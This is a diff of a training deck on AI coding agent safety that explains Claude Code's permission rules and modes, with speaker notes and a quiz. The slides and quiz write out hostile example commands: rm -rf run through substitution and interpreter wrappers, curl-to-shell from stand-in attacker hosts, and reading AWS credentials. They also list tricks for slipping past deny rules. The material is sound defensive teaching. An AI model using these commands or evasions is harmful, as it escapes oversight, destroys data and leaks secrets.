@@ -2,6 +2,12 @@
 
 > **Length**: 20 min teaching + 10 min quiz/discussion. **Position**: first mitigation session. Builds on Session 1's threat model — permissions are where the harness refuses to be steered. **One idea**: rules and modes are the in-process control layer, enforced by Claude Code itself rather than by the model.
 
+**Title**: AI Coding Agent Safety – Permission Rules and Modes
+
+**Abstract**: Building on Session 1's threat model, this session covers the first concrete mitigation layer: permission rules and permission modes. Prompt injection can steer the model into doing things you didn't intend — but the harness around the model is not steerable. Permission rules and modes are enforced by the harness itself, so they can't be talked around by adversarial input. We'll cover how rules are written and evaluated, the gotchas where they don't behave the way you'd expect, and Claude Code's six permission modes. You will learn how to configure permissions for your own work that materially reduces the risks introduced in Session 1. Content is specific to Claude Code, but the same concepts apply to other agentic coding harnesses.
+
+---
+
 ---
 
 ## Slide 1 — The model is steerable; the harness isn't
@@ -10,6 +16,8 @@
 - **Session 2**: permission rules and permission modes are where the harness refuses to go along
 - Enforced by Claude Code, **not** by the LLM
 - Same enforcement-boundary idea extends in Session 3 (sandbox = OS-enforced)
+
+**Docs:** [Permissions — enforced by Claude Code, not the model](https://code.claude.com/docs/en/permissions#manage-permissions)
 
 > - Session 1 closed on "defaults are a starting point."
 >   - This session is the first customization layer on top of those defaults.
@@ -42,6 +50,8 @@ flowchart LR
 - **Rule**: a per-tool-call pattern. `Bash(npm test *)`, `Read(./src/**)`, `WebFetch(domain:github.com)`
 - **Mode**: a session-wide policy floor that decides what happens when **no rule matches**
 - They **layer**: rules first, mode catches the rest
+
+**Docs:** [Permission modes overview](https://code.claude.com/docs/en/permissions#permission-modes)
 
 > - A rule is a pattern attached to a single tool.
 >   - `Bash(npm test *)` controls one shape of Bash command.
@@ -77,11 +87,12 @@ flowchart LR
 | `default`           | Reads only                                           | Getting started, sensitive work     |
 | `acceptEdits`       | Reads, edits, common filesystem commands             | Iterating on code you're reviewing  |
 | `auto` _(preview)_  | Everything, with background classifier checks        | Long tasks, reducing prompt fatigue |
-| `dontAsk`           | Only pre-approved tools (fails closed)               | Locked-down CI and scripts          |
 | `bypassPermissions` | Everything (fails open, two narrow circuit breakers) | Isolated containers and VMs only    |
+| `dontAsk`           | Only pre-approved tools (fails closed)               | Locked-down CI and scripts          |
 
-- Ordered most-restrictive to least
 - Deep dives at the end of the session — for now, hold the map
+
+**Docs:** [Available modes](https://code.claude.com/docs/en/permission-modes#available-modes)
 
 > - The deep-dive slides at the end of this session fill in what each mode auto-approves, what it still prompts for, and the sharp edges.
 >   - This slide is just the map.
@@ -105,6 +116,8 @@ flowchart LR
 - Plus CLI flags and `.claude/settings.local.json` for personal overrides
 - All scopes merge into one effective rule set per session
 - Example: [Trail of Bits recommended config](https://github.com/trailofbits/claude-code-config/blob/main/settings.json)
+
+**Docs:** [Settings files & scopes](https://code.claude.com/docs/en/settings#settings-files)
 
 > - Let's talk about permission rules
 >   - Where they live (this slide), how they're evaluated, what they look like, and the gotchas where they don't match what you think.
@@ -145,6 +158,8 @@ flowchart LR
 - A **deny anywhere beats an allow anywhere** — a project deny blocks a user allow, a user deny blocks a project allow
 - `ask` is checked **before** `allow` — if both match, you get prompted
 
+**Docs:** [Rule evaluation order (deny → ask → allow)](https://code.claude.com/docs/en/permissions#manage-permissions)
+
 > - Three buckets, evaluated in fixed order: deny first, then ask, then allow.
 >   - If nothing matches in any bucket, the mode's default behavior applies.
 > - "First match wins" within each bucket and across the order.
@@ -174,6 +189,8 @@ flowchart LR
 | MCP      | `mcp__puppeteer__*`           |
 | Agent    | `Agent(Explore)`              |
 
+**Docs:** [Permission rule syntax](https://code.claude.com/docs/en/permissions#permission-rule-syntax)
+
 > - Every rule is `Tool` or `Tool(specifier)`.
 >   - Without parens, the rule matches all uses of that tool.
 >   - With parens, the specifier scopes it.
@@ -197,6 +214,8 @@ flowchart LR
 - `Bash(npm install *)` — does **not** match `npm installfoo`
 - The **space before `*`** enforces a word boundary
 
+**Docs:** [Wildcard patterns](https://code.claude.com/docs/en/permissions#wildcard-patterns)
+
 > - This is the single most common rule-writing mistake.
 >   - A trailing `*` without a preceding space lets the wildcard absorb arbitrary letters into the previous token.
 > - _Source_: https://code.claude.com/docs/en/permissions
@@ -210,6 +229,8 @@ flowchart LR
 - Each subcommand matched independently
 - Recognized separators: `&&`, `||`, `;`, `|`, `|&`, `&`, newlines
 
+**Docs:** [Compound commands](https://code.claude.com/docs/en/permissions#compound-commands)
+
 > - When Claude proposes a compound command, Claude Code splits on shell operators and matches each subcommand independently.
 >   - The compound is allowed only if every piece is allowed.
 > - The full list of recognized separators per docs: `&&`, `||`, `;`, `|`, `|&`, `&`, and newlines.
@@ -218,12 +239,48 @@ flowchart LR
 
 ---
 
-## Slide 9 — The always-free read-only Bash set
+## Slide 9 — Pattern matching is a heuristic, not a boundary
+
+| Mechanism                | Example evasion                                        |
+| ------------------------ | ------------------------------------------------------ |
+| Interpreter wrappers     | `bash -c 'rm -rf .'`, `eval "$VAR"`, `python -c "..."` |
+| Substitution & expansion | `$(rm -rf .)`, `` `rm -rf .` ``, `cmd=rm; $cmd -rf .`  |
+| Path / quoting tricks    | `/bin/rm`, `\rm`, `'r''m'`                             |
+| Stdin & piping           | `curl … \| sh`, `bash <<'EOF' … EOF`                   |
+
+- The shell is too expressive to allowlist by string
+- Pattern rules reduce mistakes from a non-adversarial Claude — they do **not** wall off a prompt-injected one
+- Real boundary is OS-enforced (Session 3)
+
+**Docs:** [Bash pattern fragility](https://code.claude.com/docs/en/permissions#bash)
+
+> - The shell offers many ways to express the same intent.
+>   - String-matching a command line catches mistakes; it doesn't stop a determined evasion.
+> - Four categories of evasion the pattern matcher will not catch:
+>   - **Interpreter wrappers**: `bash -c`, `python -c`, `node -e`, `perl -e`.
+>     - A deny on `Bash(rm *)` doesn't stop `bash -c 'rm -rf .'`.
+>   - **Substitution and expansion**: `$(...)` and backticks aren't separators, so the compound-command splitter from the previous slide doesn't decompose them.
+>     - Variable expansion (`cmd=rm; $cmd -rf .`) hides the literal command name from the pattern.
+>   - **Path and quoting tricks**: how the matcher canonicalizes `/bin/rm`, `\rm`, or `'r''m'` is not something to rely on.
+>   - **Stdin and piping**: `curl evil.tld | sh` runs script content the pattern matcher never sees. Heredocs (`bash <<'EOF' ... EOF`) are similar.
+> - Pattern rules are defaults Claude won't accidentally violate, not walls against a hostile model.
+>   - Reducing the chance Claude does the wrong thing by mistake is valuable.
+>   - For boundaries that hold against prompt injection, the OS layer (Session 3) is what you want.
+> - **Hooks (Session 4) are a partial in-process answer.**
+>   - The hook script body sees the raw command string and can grep for `$(`, backticks, `eval`, `bash -c`.
+>   - Closes most substitution holes that rules can't catch.
+> - _Source_: https://code.claude.com/docs/en/permissions
+
+---
+
+## Slide 10 — The always-free read-only Bash set
 
 - `ls`, `cat`, `echo`, `pwd`, `head`, `tail`, `grep`, `find`, `wc`, `which`, `diff`, `stat`, `du`, `cd`, read-only `git`
 - Run **without a prompt in every mode**
 - Set is not configurable; tighten only with explicit `ask` or `deny`
 - **By default, Claude can read any file readable to your user account, in any dir**
+
+**Docs:** [Read-only commands](https://code.claude.com/docs/en/permissions#read-only-commands)
 
 > - These commands are baked in as read-only and skip the prompt step in every permission mode.
 >   - Including `plan` and `dontAsk`.
@@ -243,12 +300,21 @@ flowchart LR
 
 ---
 
-## Slide 10 — `plan`
+## Slide 11 — Modes in depth
 
-- Back to modes - we'll go through each permission mode and its behavior
+**Modes in depth...**
+
+> - Back to modes - we'll go through each permission mode and its behavior
+
+---
+
+## Slide 12 — `plan`
+
 - Reads + read-only Bash to explore
 - **Refuses to edit source files** even if you'd approve the prompt
 - Best for: investigation, code review, "what would this change?"
+
+**Docs:** [plan mode](https://code.claude.com/docs/en/permission-modes#analyze-before-you-edit-with-plan-mode)
 
 > - Plan mode tells Claude to research and propose changes without making them.
 >   - Reads work, read-only shell commands work, but edits are blocked regardless of what you'd say at a prompt.
@@ -266,10 +332,12 @@ flowchart LR
 
 ---
 
-## Slide 11 — `default`
+## Slide 13 — `default`
 
 - Prompts on first use of any tool that isn't read-only
 - Reads run free; writes and Bash prompt
+
+**Docs:** [Available modes (default)](https://code.claude.com/docs/en/permission-modes#available-modes)
 
 > - This is what you get if you don't pass `--permission-mode` or configure a `defaultMode`.
 > - What runs without asking.
@@ -282,12 +350,14 @@ flowchart LR
 
 ---
 
-## Slide 12 — `acceptEdits`
+## Slide 14 — `acceptEdits`
 
 - Auto-approves: file edits + `mkdir`, `touch`, `rm`, `rmdir`, `mv`, `cp`, `sed`
 - Scoped to working dir + `additionalDirectories`; everything else prompts
 - **Sharp edge**: `rm` and `rmdir` are in the auto-approved set
 - Protected paths (`.git`, `.bashrc`, `.mcp.json`, etc.) still prompt
+
+**Docs:** [acceptEdits mode](https://code.claude.com/docs/en/permission-modes#auto-approve-file-edits-with-acceptedits-mode)
 
 > - Status bar shows `⏵⏵ accept edits on`.
 > - The auto-approved filesystem commands are an exact set: `mkdir`, `touch`, `rm`, `rmdir`, `mv`, `cp`, `sed`.
@@ -301,22 +371,22 @@ flowchart LR
 
 ---
 
-## Slide 13 — `auto` _(research preview)_
+## Slide 15 — `auto` _(research preview)_
 
-- Auto-approves **everything**, subject to a background classifier
+- Eliminates permission prompts — classifier ("a second model") silently allows or blocks each gated action
 - Classifier blocks: escalation beyond your request, unknown infra, hostile-content-driven actions
-- On entry, broad allow rules (`Bash(*)`, wildcarded interpreters, package-manager runs, `Agent` allows) are **dropped**
-- Gated — Max/Team/Enterprise/API plans only, specific newer Sonnet/Opus models, Anthropic API only
+- Safety mechanism: excessive blocked actions pause auto mode, reverts to prompting
 
-> - Auto mode is "no prompts, but a second model reviews each action."
->   - The classifier sees user messages, tool calls, and CLAUDE.md content.
-> - On entry, Claude Code automatically drops broad allow rules that would otherwise neuter the classifier.
->   - Blanket `Bash(*)` or `PowerShell(*)`.
->   - Wildcarded interpreters like `Bash(python*)`.
->   - Package-manager run commands.
->   - `Agent` allow rules.
->   - Narrow rules like `Bash(npm test)` survive.
->   - Dropped rules are restored when you leave the mode.
+**Docs:** [auto mode](https://code.claude.com/docs/en/permission-modes#eliminate-prompts-with-auto-mode)
+
+> - Auto mode replaces permission prompts with classifier review.
+>   - Classifer is a model that evaluates whether or not to allow or block each action
+>   - Reads, and in-scope file edits, skip the classifier;
+>   - allow/deny rules resolve first; everything else routes through it.
+>   - The classifier sees user messages and tool calls.
+>   - Tool results are stripped before the classifier reads them, so hostile content in a file or web page can't manipulate it directly.
+> - **Fallback to prompting**: 3 consecutive or 20 total blocks pause auto mode and the session resumes prompting.
+>   - Approving the prompt resumes auto mode.
 > - The classifier trusts your working directory and your repo's configured remotes.
 >   - Anything else is treated as external until you configure trusted infrastructure separately.
 >   - Run `claude auto-mode defaults` to see the full block/allow lists.
@@ -328,14 +398,40 @@ flowchart LR
 
 ---
 
-## Slide 14 — `dontAsk`
+## Slide 16 — `bypassPermissions`
 
-- **Fails closed**: every call that would prompt is auto-denied
+- Skips all permission prompts and safety checks (including protected-path writes as of v2.1.126)
+- **Circuit breakers** (still prompt): `rm`/`rmdir` against `/`, `~`, or other critical system paths — `rm -rf /` and `rm -rf ~` are examples, not the whole list
+- Must launch with `--permission-mode bypassPermissions` (or `--dangerously-skip-permissions`)
+
+**Docs:** [bypassPermissions mode](https://code.claude.com/docs/en/permission-modes#skip-all-checks-with-bypasspermissions-mode)
+
+> - Commonly called "YOLO mode."
+>   - This is the mode that turns off every guardrail this session has covered.
+> - Has circuit breakers, but they are narrower than people often assume.
+>   - They cover `rm` and `rmdir` against critical system paths.
+>   - The docs cite `rm -rf /` and `rm -rf ~` as examples, but the broader rule is "critical system paths," not literally those two strings.
+>   - Even so: this is the only thing standing between bypass mode and arbitrary destruction.
+> - Hard precondition: you cannot enter this mode mid-session if you didn't launch with one of the enabling flags.
+> - **Sharp edge**: zero protection from prompt injection.
+>   - If a malicious dependency steers Claude to `curl attacker.tld/script | bash`, nothing in Claude Code stops it.
+>   - This mode is only safe inside an isolation layer that constrains Claude from outside — sandbox, container, VM.
+>   - Session 3 and Session 6 cover those layers.
+> - Admins can block this mode entirely via `permissions.disableBypassPermissionsMode: "disable"` in managed settings.
+> - _Sources_: https://code.claude.com/docs/en/permission-modes ("Skip all checks with bypassPermissions mode"); https://code.claude.com/docs/en/permissions ("`rm` or `rmdir` commands that target `/`, your home directory, or other critical system paths still trigger a prompt").
+
+---
+
+## Slide 17 — `dontAsk`
+
+- Every call that would prompt is auto-denied
 - Only `permissions.allow` matches and the always-free read-only Bash set execute
 - Explicit `ask` rules are **denied**, not prompted
 - For non-interactive runs (CI, scheduled agents)
 
-> - The mirror of `bypassPermissions`.
+**Docs:** [dontAsk mode](https://code.claude.com/docs/en/permission-modes#allow-only-pre-approved-tools-with-dontask-mode)
+
+> - The opposite of `bypassPermissions`.
 >   - Where `bypassPermissions` skips prompts by allowing everything, `dontAsk` skips prompts by denying everything that's not explicitly allowed.
 > - Counterintuitive subtlety: an `ask: Bash(curl *)` rule under `dontAsk` _blocks_ `curl`.
 >   - Because there's no user to prompt, "ask" effectively means "deny."
@@ -349,30 +445,7 @@ flowchart LR
 
 ---
 
-## Slide 15 — `bypassPermissions`
-
-- Skips all permission prompts and safety checks (including protected-path writes as of v2.1.126)
-- **Circuit breakers** (still prompt): `rm`/`rmdir` against `/`, `~`, or other critical system paths — `rm -rf /` and `rm -rf ~` are examples, not the whole list
-- Must launch with `--permission-mode bypassPermissions` (or `--dangerously-skip-permissions`)
-
-> - Commonly called "YOLO mode."
->   - This is the mode that turns off every guardrail this session has covered.
-> - The circuit breakers are narrower than people often assume.
->   - They cover `rm` and `rmdir` against critical system paths.
->   - The docs cite `rm -rf /` and `rm -rf ~` as examples, but the broader rule is "critical system paths," not literally those two strings.
->   - Even so: this is the only thing standing between bypass mode and arbitrary destruction.
-> - Hard precondition: you cannot enter this mode mid-session if you didn't launch with one of the enabling flags.
-> - **Sharp edge**: zero protection from prompt injection.
->   - If a malicious dependency steers Claude to `curl attacker.tld/script | bash`, nothing in Claude Code stops it.
->   - This mode is only safe inside an isolation layer that constrains Claude from outside — sandbox, container, VM.
->   - Session 3 and Session 6 cover those layers.
-> - Admins can block this mode entirely via `permissions.disableBypassPermissionsMode: "disable"` in managed settings.
->   - Covered in Session 5.
-> - _Sources_: https://code.claude.com/docs/en/permission-modes ("Skip all checks with bypassPermissions mode"); https://code.claude.com/docs/en/permissions ("`rm` or `rmdir` commands that target `/`, your home directory, or other critical system paths still trigger a prompt").
-
----
-
-## Slide 16 — Recap and what's next
+## Slide 18 — Recap and what's next
 
 ```mermaid
 flowchart LR
@@ -391,6 +464,8 @@ flowchart LR
 - But: enforced by Claude Code itself — if Claude Code is compromised, permissions fall with it
 - **Session 3**: sandbox moves the boundary one layer down to the OS
 
+**Docs:** [Next: Sandboxing](https://code.claude.com/docs/en/sandboxing)
+
 > - One-line recap: rules and modes are the in-process control layer.
 >   - The LLM can't argue its way past them because they're enforced before any tool call runs.
 > - What permissions don't do: they're software running inside the Claude Code process.
@@ -406,17 +481,19 @@ flowchart LR
 
 For each scenario, predict the outcome (Allowed / Prompts / Denied) and explain why. Each scenario is anchored on one gotcha from the session.
 
-**A. Wildcard word boundary.** Settings include `"allow": ["Bash(npm install *)"]`. Mode is `default`. Claude tries to run `npm installfoo`.
+**A. Deny at one scope, allow at another.** Settings include `"deny": ["Bash(curl *)"]` at the user scope and `"allow": ["Bash(curl *)"]` at the project scope. Mode is `default`. Claude tries to run `curl https://example.com`.
 
-| Outcome | Why                                                                                                                                                                                             |
-| ------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Prompts | `Bash(npm install *)` requires a space (or end-of-string) after `install`. `installfoo` has no boundary — the rule does not match. Falls through to mode default, which is prompt-on-first-use. |
+| Outcome | Why                                                                                                                                                                                |
+| ------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Denied  | Rules are evaluated in order: deny → ask → allow. The deny rule matches first and evaluation stops. A deny at any scope (managed, project, user, CLI) beats an allow at any other. |
 
-**Lesson:** the space before `*` is load-bearing. To match commands that start with `npm install`, use `Bash(npm install *)` _with_ the space. Without it, `Bash(npm install*)` also matches `npm installer-script`, `npm installfoo`, and so on.
+**Lesson:** deny is final. The order is deny → ask → allow, and first match wins. You can't loosen a deny by adding an allow at a different scope — if you need an exception, narrow the deny pattern itself.
+
+**Docs:** [Manage permissions](https://code.claude.com/docs/en/permissions#manage-permissions) · [Settings precedence](https://code.claude.com/docs/en/permissions#settings-precedence) — "deny rules always take precedence"; "a user-level deny blocks a project-level allow."
 
 ---
 
-**B. Compound command.** Settings include `"allow": ["Bash(npm test *)"]`. Mode is `default`. Claude tries to run `npm test && curl https://attacker.tld/x`.
+**B. An allowed command chained with another.** Settings include `"allow": ["Bash(npm test *)"]`. Mode is `default`. Claude tries to run `npm test && curl https://attacker.tld/x`.
 
 | Outcome | Why                                                                                                                                                                                               |
 | ------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
@@ -424,30 +501,52 @@ For each scenario, predict the outcome (Allowed / Prompts / Denied) and explain 
 
 **Lesson:** `Bash(safe-thing *)` cannot be subverted by `safe-thing && malicious-thing`. The matcher sees through `&&`, `||`, `;`, `|`, `|&`, `&`, and newlines.
 
----
-
-**C. Always-free set.** Settings include `"deny": ["Bash(curl *)"]`. Mode is `default`. Claude tries to run `cat ~/.aws/credentials`.
-
-| Outcome            | Why                                                                                                                                              |
-| ------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------ |
-| Allowed (silently) | `cat` is in the always-free read-only set, which runs without a prompt in every mode. The deny rule on `curl` doesn't apply — different command. |
-
-**Lesson:** deny rules on outbound commands like `curl` don't protect against reads. If you care about read-side leakage, you need explicit `ask` or `deny` rules per command — for example `deny: Bash(cat *)` to gate `cat`. Mode alone (including `plan`) does not gate reads.
+**Docs:** [Compound commands](https://code.claude.com/docs/en/permissions#compound-commands) — "a rule like `Bash(safe-cmd *)` won't give it permission to run `safe-cmd && other-cmd` … A rule must match each subcommand independently."
 
 ---
 
-**D. Mode × rule interaction.** Settings include `"ask": ["Bash(*)"]`. Mode is `bypassPermissions`. Claude tries to run any Bash command.
+**C. Reading credentials with no rules configured.** No permission rules are configured. Mode is `default`. Claude tries to run `cat ~/.aws/credentials`.
+
+| Outcome            | Why                                                                                                                         |
+| ------------------ | --------------------------------------------------------------------------------------------------------------------------- |
+| Allowed (silently) | `cat` is in the always-free read-only Bash set, which runs without a prompt in every mode — including `plan` and `dontAsk`. |
+
+**Lesson:** mode alone doesn't gate reads. By default, Claude can `cat`, `grep`, or `find` anything readable to your user account without prompting. If you care about read-side leakage, write explicit `ask` or `deny` rules per command — for example `deny: Bash(cat *)`.
+
+**Docs:** [Read-only commands](https://code.claude.com/docs/en/permissions#read-only-commands) — "a built-in set of Bash commands as read-only and runs them without a permission prompt in every mode … The set is not configurable; to require a prompt … add an `ask` or `deny` rule."
+
+---
+
+**D. An ask rule under bypassPermissions.** Settings include `"ask": ["Bash(*)"]`. Mode is `bypassPermissions`. Claude tries to run any Bash command.
 
 | Outcome             | Why                                                                                                                                                                                     |
 | ------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
 | Allowed (no prompt) | `bypassPermissions` skips the permission layer entirely — including ask rules. The only things that still prompt are the circuit breakers (`rm`/`rmdir` against critical system paths). |
 
-**Lesson:** rules and modes layer, but `bypassPermissions` is the one mode that short-circuits the rule layer for prompting purposes. An `ask` rule provides no protection in bypass mode. Conversely, `deny` rules from any scope still apply to non-circuit-breaker calls — but you're trusting the harness alone to enforce them.
+**Lesson:** rules and modes layer in every mode except `bypassPermissions`, which skips the permission layer entirely. An `ask` rule provides no protection there — and neither does a `deny`. The only calls bypass mode still stops are the circuit breakers.
+
+**Docs:** [bypassPermissions mode](https://code.claude.com/docs/en/permission-modes#skip-all-checks-with-bypasspermissions-mode) — "Modes set the baseline. Layer permission rules on top … in any mode except `bypassPermissions`, which skips the permission layer entirely."
 
 ---
 
-## Discussion (5 min)
+**E. A deny rule for rm, and rm in backticks.** Settings include `"deny": ["Bash(rm *)"]`. Mode is `default`. Claude tries to run `` echo `rm -rf node_modules` ``.
 
-- "What's on your current deny list? What's missing? What does your team's policy assume about you that may not be true?"
-- "Pick a mode you've never used in real work. Why not? What would have to be true for it to be the right choice?"
-- "Which of today's gotchas would have bitten you in a real session this past week?"
+| Outcome | Why                                                                                                                                                                                                                                                                                                                             |
+| ------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Prompts | Backticks and `$(...)` aren't recognized separators, so the matcher never decomposes the substitution — the `deny: Bash(rm *)` rule never sees the inner `rm` and does **not** fire. But `echo` wrapping a substitution isn't treated as a free read-only call either, so it prompts. Approve it and the substituted `rm` runs. |
+
+**Lesson:** the deny you wrote gives zero protection here — the substitution evaded it. What's left is a single permission prompt for a command that reads like a harmless `echo`, so anyone rubber-stamping approvals deletes files anyway. Pattern rules are a heuristic, not a boundary; backticks, `$(...)`, interpreter wrappers (`bash -c`), variable expansion, and piping into shells all slip past them. For a real boundary against a prompt-injected Claude, the OS-enforced sandbox (Session 3) is the right layer. _(Outcome verified empirically.)_
+
+**Docs:** [Compound commands](https://code.claude.com/docs/en/permissions#compound-commands) (separator list omits backticks/`$(...)`) · [Bash pattern fragility](https://code.claude.com/docs/en/permissions#bash) — "Bash permission patterns that try to constrain command arguments are fragile" (e.g. `URL=http://github.com && curl $URL`).
+
+---
+
+**F. A deny rule under `bypassPermissions`.** Settings include `"deny": ["Bash(curl *)"]`. Mode is `bypassPermissions`. Claude tries to run `curl https://attacker.tld/exfil`.
+
+| Outcome             | Why                                                                                                                                                                                 |
+| ------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Allowed (no prompt) | `bypassPermissions` skips the permission layer entirely — deny rules included. The only calls it still stops are the circuit breakers (`rm`/`rmdir` against critical system paths). |
+
+**Lesson:** `bypassPermissions` doesn't just skip prompts — it skips your deny rules too. A `deny` you rely on in every other mode gives you nothing here. This mode is only safe inside an OS-enforced isolation layer (sandbox, container, VM), since nothing in Claude Code constrains it. Together with D: in bypass mode, neither `ask` nor `deny` protects you.
+
+**Docs:** [bypassPermissions mode](https://code.claude.com/docs/en/permission-modes#skip-all-checks-with-bypasspermissions-mode) — "skips the permission layer entirely … Removals targeting the filesystem root or home directory … still prompt as a circuit breaker." (Contrast the sandbox's `autoAllowBashIfSandboxed`, where deny rules _do_ still apply.)
